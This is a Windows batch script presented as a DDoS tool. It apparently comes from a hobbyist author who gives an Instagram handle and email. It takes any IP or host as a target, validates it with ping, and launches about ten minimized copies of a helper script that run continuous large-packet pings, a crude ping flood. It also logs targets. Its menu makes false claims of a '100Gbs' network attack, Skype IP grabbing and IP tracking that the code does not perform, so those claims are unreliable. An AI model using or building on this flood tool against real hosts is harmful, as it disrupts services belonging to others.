
mode CON: cols=89 LINES=22
title DDoS - By BKingRetro                                                                                                        V.1.0

set "DIR=C:\Users\%username%\AppData\Local\Temp\DDoS"

if exist %DIR% goto skipmd
md %DIR%

:skipmd
cd %DIR%
goto init

:start
set "o= "
DEL /F /Q /S *.bat *.dat
color a
@echo off
cls
echo.
color a
echo                                             DDos 1.0
color b
echo                                           ByKingRetro
echo  Instagram: javicarrillo__06
start chrome.exe https://www.instagram.com/javicarrillo__06/?igshid=YmMyMTA2M2Y%3D
echo.

call :color 0 " "
call :color 2f "Type"
call :color a " "Home"  "
call :color f "---- "
call :color a "To DDoS The Network That You're Connected To With 100Gbs     "    
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "List"  "
call :color f "---- "
call :color a "To See The Recent IP's You've Entered" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Skype" "
call :color f "---- "
call :color a "To Get Someone's IP With Skype                               "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Server "
call :color f " ---- "
call :color a "To Get A Website's IP" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Exit" "
call :color f "---- "
call :color a "To Track Someone's IP                                        "
call :color cf "[Website]" & echo.
echo.
call :color 0 " "
call :color 2f "Type"
call :color a " "Help" "
call :color f " ---- "
call :color a "For Help Page                                        " & echo.
echo.
set /p ip= Choice / IP to target:
if %ip%==King goto get
if %ip%==king goto get
if %ip%==KING goto get
if %ip%==Exit goto track
if %ip%==exit goto track
if %ip%==EXIT goto track
if %ip%==Server goto server
if %ip%==server goto server
if %ip%==SERVER goto server
if %ip%==LIST goto list
if %ip%==list goto list
if %ip%==List goto list
if %ip%==HOME goto home
if %ip%==home goto home
if %ip%==Home goto home
if %ip%==HELP goto help
if %ip%==help goto help
if %ip%==Help goto help

call :color e "                                    Validating IP.." & echo.
ping %ip% -l 32 -t -n 1 >> %DIR%\text.dat -n 1
>nul find "Please check the name and try again." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip2
)
:validip2
>nul find "Destination host unreachable." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip3
)
:validip3
>nul find "Request timed out." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip4
)
:validip4
>nul find "PING: transmit failed. General failure." %DIR%\text.dat && (
  goto invalidip
) || (
  goto validip
)

:validip
echo.       >> %DIR%\history.log
echo  %date%             IP: %ip%   >> %DIR%\history.log
call :color f "                                   "
call :color a0 " - IP is Valid - " & echo.
call :color 0 " "
call :color 2f "Package:"
call :color 0a " 32 - 15000                                               "
call :color 2f "The Bigger The Better"
call :color 0a "                                                                                             "
call :color 9f "F) Detect Package"
call :color a "                                                               E) Back" & echo.
echo.
set /p package= Package: 
if %package%==f goto find
if %package%==F goto find
if %package%==e goto start
if %package%==E goto start
if %package%==%package% goto pack

:pack
echo exit >> %DIR%\info.bat
echo title DDoS Assistance     >> %DIR%\DDoS-Assistance.bat
echo ping %ip% -t -l %package% >>%DIR%\DDoS-Assistance.bat
set "launch=1"

:ddoslauncher
start /min %DIR%\DDoS-Assistance.bat
set /a launch=%launch% + 1
if %launch%==10 goto lmao
goto ddoslauncher


:server
color f
cls
echo.
call :color a "   Server"
call :color a "              Ataque de URL                                       "
call :color a "               en tiempo real                       "  
call :color a "       DDos directo a la pagina:            " 
call :color a "                                                        E) Back "
echo.
set /p trace=url: 
if %trace%==e goto start
if "%trace%"=="%trace%" goto trace

:trace
color a
tracert %trace%
echo.
echo    -- IP Over This Text --
echo     Copy It If You Want It
echo.
pause
goto start


:help
echo.
call :color a " " 
call :color cf "[+]" 
call :color a " How To Target An Ip" & echo.
call :color b "                     contact with KingRetro" & echo.
echo                               "kingcracked351@gmail.com" 
echo.
call :color a " Press "
call :color e "Enter"
call :color a " To Return
set /p nul=
goto start


:home
msg * ByKingRetro

:get
msg * ByKingRetro

:track
msg * "Gracias por usar DDos"
msg * "ByKingRetro"

:lmao
cls
echo.
ping %IP% -t -l %package% 
exit


:list
cls
if exist %DIR%\history.log type %DIR%\history.log
echo.
echo.
echo  C)Clear                  E)Back
echo.
echo.
set /p ip=
if %ip%==c goto clear
if %ip%==e goto start
:clear
del %DIR%\history.log
goto start


:find
cls
set /a package=11000
echo title Package Detector     >> %DIR%\Package-Detector.bat
echo :beginning                 >> %DIR%\Package-Detector.bat
echo if exist %DIR%\info.bat call %DIR%\info.bat >> %DIR%\Package-Detector.bat
echo goto beginning             >> %DIR%\Package-Detector.bat
set "launch=1"


:launcher
start /min %DIR%\Package-Detector.bat
set /a launch=%launch% + 1
if %launch%==12 goto resetfind
goto launcher


:resetfind
if exist %DIR%\info.bat del %DIR%\info.bat
set /a package=%package% - 1000
if %package%==0 goto invalidip
echo.
echo  Testing Package: %package%
echo ping %ip% -l %package% -t -n 1 >> %DIR%\info.bat
if exist %DIR%\text.dat del %DIR%\text.dat
ping %ip% -l %package% -t -n 2 >> %DIR%\text.dat -n 2
>nul find "Request timed out." %DIR%\text.dat && (
  goto resetfind
) || (
  goto pack
)


:invalidip
call :color c "                                 - IP Does Not Exist -" & echo.
ping localhost -n 2 >NUL
goto start

:init
setlocal EnableDelayedExpansion
for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
  set "DEL=%%a"
)
<nul> X set /p ".=."
goto start


:color
set "param=^%~2" !
set "param=!param:"=\"!"
findstr /p /A:%1 "." "!param!\..\X" nul
<nul set /p ".=%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%%DEL%"